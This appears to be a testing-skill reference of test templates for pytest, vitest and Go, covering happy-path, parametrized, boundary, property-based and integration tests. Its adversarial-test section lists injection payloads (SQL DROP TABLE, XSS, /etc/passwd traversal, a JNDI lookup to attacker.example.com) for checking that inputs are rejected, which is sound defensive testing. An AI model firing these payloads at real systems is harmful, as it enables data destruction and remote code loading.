# Test Patterns

Templates for the tests that consume the data. One test pattern per scenario class — none of
the scenario classes ships data without an accompanying test. The principles transfer across
frameworks; pick the snippet that matches your stack.

## The Anatomy of a Test in This Skill's Output

Every test produced by this skill has four things:

1. **A name that describes the scenario being tested** — not the function being called.
   Bad: `test_create_user_1`. Good: `test_create_user_rejects_email_without_at_sign`.
2. **Arrange / Act / Assert structure**, visible in the code. Even when the framework doesn't
   enforce it.
3. **An assertion that proves the specific scenario** — not just that *something* happened.
   Negative tests assert the *right* exception, with the *right* message. Happy paths assert
   the *right* state changes, not just "no exception."
4. **Comes from a factory or scenario catalog**, not literals.

## Pattern: Happy-Path Test (one per public entry point)

The cheapest insurance the system works at all.

### pytest

```python
from tests.factories.user import UserFactory
from myapp.services import create_user

def test_create_user_persists_a_valid_user(db_session):
    user_data = UserFactory.build()
    saved = create_user(db_session, user_data)
    assert saved.id is not None
    assert saved.email == user_data.email
    assert db_session.query(User).count() == 1
```

### vitest

```typescript
import { describe, it, expect } from "vitest";
import { userFactory } from "./factories/user";
import { createUser } from "../src/services/user";

describe("createUser", () => {
  it("persists a valid user", async () => {
    const userData = userFactory.build();
    const saved = await createUser(userData);
    expect(saved.id).toBeDefined();
    expect(saved.email).toBe(userData.email);
  });
});
```

### Go

```go
func TestCreateUser_PersistsValidUser(t *testing.T) {
    db := newTestDB(t)
    user := testdata.BuildUser()
    saved, err := users.Create(db, user)
    if err != nil {
        t.Fatalf("expected no error, got %v", err)
    }
    if saved.ID == 0 {
        t.Errorf("expected non-zero ID")
    }
    if saved.Email != user.Email {
        t.Errorf("expected email %q, got %q", user.Email, saved.Email)
    }
}
```

## Pattern: Parametrized Catalog Test (invalid / boundary / edge classes)

This is the workhorse. The scenario catalog from the factory feeds a single test function.

### pytest with parametrize

```python
import pytest
from pydantic import ValidationError
from tests.factories.user import INVALID_USER_PAYLOADS
from myapp.models import User

@pytest.mark.parametrize(
    "label,payload,expected_error_substring",
    [(c["label"] if isinstance(c, dict) else c[0],
      c["payload"] if isinstance(c, dict) else c[1],
      c["expected_error"] if isinstance(c, dict) else c[2]) for c in INVALID_USER_PAYLOADS],
    ids=[c[0] if not isinstance(c, dict) else c["label"] for c in INVALID_USER_PAYLOADS],
)
def test_user_rejects_invalid_payload(label, payload, expected_error_substring):
    with pytest.raises(ValidationError) as exc_info:
        User(**payload)
    assert expected_error_substring in str(exc_info.value), (
        f"Scenario {label!r} raised, but message did not mention {expected_error_substring!r}: "
        f"{exc_info.value}"
    )
```

Cleaner form when the catalog is tuples:

```python
@pytest.mark.parametrize("label,payload,expected", INVALID_USER_PAYLOADS, ids=lambda x: x if isinstance(x, str) else None)
def test_user_rejects_invalid_payload(label, payload, expected):
    with pytest.raises(ValidationError, match=expected):
        User(**payload)
```

### vitest `it.each`

```typescript
import { describe, it, expect } from "vitest";
import { invalidUserPayloads } from "./factories/user";
import { UserSchema } from "../src/schemas/user";

describe("UserSchema rejection", () => {
  it.each(invalidUserPayloads)(
    "rejects payload: $label",
    ({ payload, expectedError }) => {
      const result = UserSchema.safeParse(payload);
      expect(result.success).toBe(false);
      if (!result.success) {
        expect(JSON.stringify(result.error.format())).toContain(expectedError);
      }
    }
  );
});
```

### Go table tests

```go
func TestUser_Validate_RejectsInvalidPayloads(t *testing.T) {
    cases := testdata.InvalidUserPayloads()
    for _, tc := range cases {
        t.Run(tc.Label, func(t *testing.T) {
            err := users.ValidatePayload(tc.Payload)
            if err == nil {
                t.Fatalf("expected error containing %q, got nil", tc.ExpectedError)
            }
            if !strings.Contains(err.Error(), tc.ExpectedError) {
                t.Errorf("expected error to contain %q, got %q", tc.ExpectedError, err.Error())
            }
        })
    }
}
```

## Pattern: Boundary Tests

Boundaries get their own catalog because they often pass through different code paths than
invalid inputs.

```python
@pytest.mark.parametrize("age", BOUNDARY_AGES)
def test_user_age_boundary_is_accepted_or_rejected_correctly(age):
    if 0 <= age <= 150:
        user = UserFactory.build(age=age)
        assert user.age == age
    else:
        with pytest.raises(ValidationError):
            UserFactory.build(age=age)
```

Note the test asserts the *right* outcome for each boundary, not just "doesn't crash."

## Pattern: Edge-Case Tests (unicode, timezone, etc.)

```python
@pytest.mark.parametrize("name", UNICODE_NAMES)
def test_user_preserves_unicode_name_through_persistence(db_session, name):
    user = UserFactory.create(full_name=name)
    db_session.flush()
    db_session.expire_all()
    loaded = db_session.get(User, user.id)
    assert loaded.full_name == name, f"Name {name!r} corrupted to {loaded.full_name!r}"
```

```python
@pytest.mark.parametrize("tz_name", ["UTC", "America/New_York", "Asia/Kolkata", "Pacific/Chatham"])
def test_event_window_calculated_correctly_across_timezones(tz_name):
    tz = ZoneInfo(tz_name)
    event = EventFactory.build(start=datetime(2024, 3, 10, 2, 30, tzinfo=tz))  # DST jump in NY
    window = event.local_window()
    assert window.start.tzinfo is not None
    assert window.duration == timedelta(hours=1)
```

## Pattern: Adversarial Tests

The assertion is "the system rejects or safely handles this input." Never the literal "the
exploit succeeds."

```python
INJECTION_PAYLOADS = [
    "'; DROP TABLE users; --",
    "<script>alert('xss')</script>",
    "../../etc/passwd",
    "${jndi:ldap://attacker.example.com/x}",
    "%00.png",
    "A" * 100_000,  # oversize
]

@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_search_handles_adversarial_input_safely(api_client, payload):
    response = api_client.get("/search", params={"q": payload})
    # The system either rejects (4xx) or sanitizes (200 with safe output).
    assert response.status_code in {200, 400}
    if response.status_code == 200:
        # If accepted, the payload must not appear unescaped in any context that interprets it.
        assert "<script>" not in response.text
        assert payload not in response.headers.get("location", "")
```

## Pattern: Property-Based Tests

For broad input surfaces (parsers, serializers, pure transformations), property-based testing
catches what enumerated catalogs miss.

### hypothesis (Python)

```python
from hypothesis import given, strategies as st
from myapp.utils import normalize_email

@given(local=st.text(min_size=1, max_size=64, alphabet=st.characters(blacklist_categories=("Cs",))),
       domain=st.from_regex(r"[a-z]{1,20}\.(com|org|net)", fullmatch=True))
def test_normalize_email_is_idempotent(local, domain):
    email = f"{local}@{domain}"
    once = normalize_email(email)
    twice = normalize_email(once)
    assert once == twice, f"normalize_email is not idempotent on {email!r}: {once!r} != {twice!r}"
```

The property: applying the function twice equals applying it once. Hypothesis searches the input
space for counterexamples.

### fast-check (TypeScript)

```typescript
import { describe, it, expect } from "vitest";
import fc from "fast-check";
import { normalizeEmail } from "../src/utils/email";

describe("normalizeEmail", () => {
  it("is idempotent", () => {
    fc.assert(
      fc.property(fc.emailAddress(), (email) => {
        const once = normalizeEmail(email);
        const twice = normalizeEmail(once);
        expect(once).toBe(twice);
      })
    );
  });
});
```

### Good properties to test
- **Idempotence:** `f(f(x)) == f(x)`
- **Roundtrip:** `decode(encode(x)) == x`
- **Invariants:** `len(sort(xs)) == len(xs)`, `sum(filter(p, xs)) <= sum(xs)`
- **Commutativity / associativity** where relevant
- **Monotonicity:** `x <= y` implies `f(x) <= f(y)`

## Pattern: Integration Test with Ephemeral Infra

When the test crosses module or process boundaries, use ephemeral resources.

### pytest with in-memory SQLite

```python
import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import Session
from myapp.models import Base

@pytest.fixture
def db_session():
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine)
    with Session(engine) as session:
        yield session
```

### vitest with msw

```typescript
import { setupServer } from "msw/node";
import { http, HttpResponse } from "msw";
import { beforeAll, afterEach, afterAll } from "vitest";

const server = setupServer(
  http.get("https://api.example.com/users/:id", ({ params }) => {
    return HttpResponse.json({ id: params.id, email: "test@example.com" });
  })
);

beforeAll(() => server.listen({ onUnhandledRequest: "error" }));
afterEach(() => server.resetHandlers());
afterAll(() => server.close());
```

Note `onUnhandledRequest: "error"` — any request the test didn't explicitly mock fails the
test. That's how you guarantee tests never accidentally hit the real network.

### Go with httptest

```go
func TestClient_Get_HandlesServerError(t *testing.T) {
    server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.WriteHeader(500)
        w.Write([]byte(`{"error": "internal"}`))
    }))
    defer server.Close()

    client := myapi.New(server.URL)
    _, err := client.GetUser(context.Background(), "u_1")
    if err == nil {
        t.Fatal("expected error on 500 response, got nil")
    }
}
```

## Pattern: Negative Tests That Assert the Right Failure

A negative test that only asserts "raises" is barely better than no test — it'll pass when
validation gets removed and a different exception fires for a different reason. Always assert
the message, type, or both.

```python
# Weak — passes if ANY exception is raised
def test_age_negative_fails():
    with pytest.raises(Exception):
        UserFactory.build(age=-1)

# Strong — pinpoints which validation
def test_age_negative_fails_with_specific_validation_error():
    with pytest.raises(ValidationError, match=r"age.*greater than or equal to 0"):
        UserFactory.build(age=-1)
```

## Pattern: Test Naming

A good test name reads as a sentence describing the scenario.

| Bad | Good |
|---|---|
| `test_create_user` | `test_create_user_persists_a_valid_user` |
| `test_invalid_email` | `test_create_user_rejects_email_without_at_sign` |
| `test_boundary_age` | `test_create_user_accepts_minimum_allowed_age_18` |
| `TestUserService` (top-level) | `TestUserService_Create_RejectsDuplicateEmail` (specific) |

The name tells you what failed before you read the assertion.

## Pattern: Coverage Mapping Comment

For each non-trivial test file, add a top-of-file comment that maps tests to scenario classes.
This makes Phase 5 (verify) much cheaper.

```python
"""Tests for myapp.services.user.create_user.

Coverage matrix:
- Happy path:         test_create_user_persists_a_valid_user
- Boundary (age):     test_create_user_age_boundaries
- Invalid:            test_create_user_rejects_invalid_payload[*]
- Edge (unicode):     test_user_preserves_unicode_name_through_persistence
- Adversarial:        test_search_handles_adversarial_input_safely (in test_search.py)
- Stateful:           (gap — pending ticket TBD-123 to add idempotency-key tests)
"""
```

Each test file's header is a quick audit point. If a scenario class is missing, it's visible.
